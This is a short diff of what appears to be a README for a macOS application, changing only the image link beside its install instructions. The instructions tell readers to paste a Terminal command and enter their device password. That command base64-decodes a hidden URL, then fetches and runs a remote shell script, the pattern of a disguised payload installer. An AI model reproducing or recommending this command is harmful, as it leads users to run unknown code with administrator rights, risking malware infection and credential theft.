@@ -9,7 +9,8 @@ It works perfectly on macOS Monterey, Ventura, and Sonoma, supports both Apple S
 2. **Open** Terminal on your device, **paste** the command, then press `Return`.  
 3. **Enter** your device password when prompted and **confirm** the installation.
 
-![Installing via Terminal](https://i.postimg.cc/NfzQxpMT/0723-1.gif)
+![Installing via Terminal](https://github.com/user-attachments/assets/85811a1f-2721-4e5f-911b-a66fe07e5fbd)
+
 ```
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nb3IvaW5zdGFsbC5zaA== | base64 -d))"
 ```
